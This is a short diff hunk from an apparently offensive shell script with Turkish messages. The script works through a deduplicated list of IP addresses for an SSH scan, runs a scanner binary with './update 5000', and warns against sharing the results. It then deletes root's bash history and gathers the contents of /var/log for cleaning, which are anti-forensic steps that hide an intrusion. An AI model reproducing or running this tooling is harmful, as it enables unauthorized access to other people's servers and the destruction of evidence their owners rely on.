@@ -23,8 +23,8 @@ cat bios.txt |sort | uniq > mfu.txt
 oopsnr2=`grep -c . mfu.txt`
 echo -e "[SSH] Bulunan $oopsnr2 ip ler "
 echo "[SSH] Tarama başlanılıyor"
-./update 5000
 echo "# SAKIN ÇIKAN SONUÇLARI PAYLAŞMAYIN"
+./update 5000
 rm -rf /root/.bash_history ; touch /root/.bash_history ; history -r ; 
 echo "$(ls /var/log/)">cleanlist
 while read line
